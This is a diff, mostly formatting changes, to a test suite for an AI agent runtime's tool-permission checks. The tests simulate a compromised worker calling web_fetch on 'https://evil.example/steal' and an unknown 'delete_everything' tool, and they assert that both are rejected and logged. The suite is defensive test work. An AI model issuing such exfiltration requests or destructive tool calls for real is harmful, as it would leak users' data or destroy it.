@@ -26,7 +26,13 @@ from app.models.project import Project
 from app.models.telemetry_span import TelemetrySpan
 from app.skills.system_actions import execute_tool
 
-from .harness import compromised_tool_call, faux_service, final_text, requires_node, tool_call
+from .harness import (
+    compromised_tool_call,
+    faux_service,
+    final_text,
+    requires_node,
+    tool_call,
+)
 
 pytestmark = requires_node
 
@@ -42,13 +48,17 @@ async def _mk_project(project_id: str, name: str) -> None:
 async def _rejection_spans(project_id: str) -> list[TelemetrySpan]:
     async with async_session() as db:
         return (
-            await db.execute(
-                select(TelemetrySpan).where(
-                    TelemetrySpan.project_id == project_id,
-                    TelemetrySpan.event_kind == "pi_tool_authority_rejection",
+            (
+                await db.execute(
+                    select(TelemetrySpan).where(
+                        TelemetrySpan.project_id == project_id,
+                        TelemetrySpan.event_kind == "pi_tool_authority_rejection",
+                    )
                 )
             )
-        ).scalars().all()
+            .scalars()
+            .all()
+        )
 
 
 @pytest.mark.asyncio
@@ -63,7 +73,10 @@ async def test_compromised_worker_web_fetch_rejected_from_delegation():
 
     sup = PiRuntimeSupervisor()
     svc = faux_service(
-        [compromised_tool_call("web_fetch", {"url": "https://evil.example/steal"}), final_text("done")],
+        [
+            compromised_tool_call("web_fetch", {"url": "https://evil.example/steal"}),
+            final_text("done"),
+        ],
         sup,
     )
 
@@ -117,7 +130,10 @@ async def test_in_catalog_delegation_tool_executes_without_audit_row():
 
     sup = PiRuntimeSupervisor()
     svc = faux_service(
-        [tool_call("create_task", {"title": "Delegated analysis"}), final_text("Delegation complete.")],
+        [
+            tool_call("create_task", {"title": "Delegated analysis"}),
+            final_text("Delegation complete."),
+        ],
         sup,
     )
 
@@ -166,15 +182,21 @@ async def test_unknown_tool_name_rejected_with_structured_error():
         events = [
             event
             async for event in svc.run_chat_turn(
-                project_id=project_id, agent_id=agent_id, system_prompt=_SYS,
-                history=[], user_text="Try anything.", tool_executor=spy_executor,
+                project_id=project_id,
+                agent_id=agent_id,
+                system_prompt=_SYS,
+                history=[],
+                user_text="Try anything.",
+                tool_executor=spy_executor,
                 session_key=f"{project_id}:chat",
             )
         ]
     finally:
         await sup.shutdown()
 
-    assert [e["type"] for e in events if e["type"] in ("done", "error", "aborted")] == ["done"]
+    assert [e["type"] for e in events if e["type"] in ("done", "error", "aborted")] == [
+        "done"
+    ]
     spans = await _rejection_spans(project_id)
     assert len(spans) == 1
     assert spans[0].tool_name == "delete_everything"
@@ -190,4 +212,6 @@ def test_catalog_tool_names_matches_exported_catalog():
         entry["name"] for entry in delegation
     }
     assert "web_fetch" in catalog_tool_names()  # canonical surface has it…
-    assert "web_fetch" not in catalog_tool_names(DELEGATION_TOOLS)  # …not the delegation allowlist
+    assert "web_fetch" not in catalog_tool_names(
+        DELEGATION_TOOLS
+    )  # …not the delegation allowlist
